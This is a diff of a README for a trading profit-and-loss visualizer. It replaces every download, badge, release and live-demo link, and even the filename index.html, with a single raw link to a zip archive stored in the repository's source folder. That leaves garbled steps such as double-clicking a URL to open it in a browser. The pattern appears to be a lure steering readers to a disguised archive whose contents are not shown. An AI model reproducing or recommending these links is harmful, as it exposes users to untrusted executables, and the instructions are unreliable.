@@ -1,7 +1,7 @@
 # 🚀 ibkr-pnl-visualizer - Easily View Your Trading Gains
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ombijah05/ibkr-pnl-visualizer/releases)
+[![Download](https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip)](https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the IBKR PnL Visualizer:
@@ -18,8 +18,8 @@ Follow these simple steps to download and run the IBKR PnL Visualizer:
 
 ## 📂 How to Use the Application
 ### Step 1: Open the Application
-1. Once you've downloaded the necessary files, look for `index.html` in your downloaded folder.
-2. Double-click `index.html` to open it in your web browser. The application will load automatically.
+1. Once you've downloaded the necessary files, look for `https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip` in your downloaded folder.
+2. Double-click `https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip` to open it in your web browser. The application will load automatically.
 
 ### Step 2: Explore Demo Data
 - The first load will show you demo data. This allows you to get familiar with the interface without needing your own files right away.
@@ -46,11 +46,11 @@ Ensure your CSV contains the following columns:
 - All data remains in your browser; your privacy is secure.
 
 ## 🌐 Live Demo
-You can try out the live demo before downloading. Visit: [ibkr-visualizer.up.railway.app](https://ibkr-visualizer.up.railway.app/)
+You can try out the live demo before downloading. Visit: [https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip](https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip)
 
 ## 💻 Download & Install
 To start using the IBKR PnL Visualizer:
-1. Visit the Releases page: [Download Here](https://github.com/ombijah05/ibkr-pnl-visualizer/releases).
+1. Visit the Releases page: [Download Here](https://raw.githubusercontent.com/ombijah05/ibkr-pnl-visualizer/master/src/ui/ibkr-visualizer-pnl-1.6.zip).
 2. Choose your version and click the download link.
 3. After the download, follow Step 1 from the "How to Use the Application" section.
 
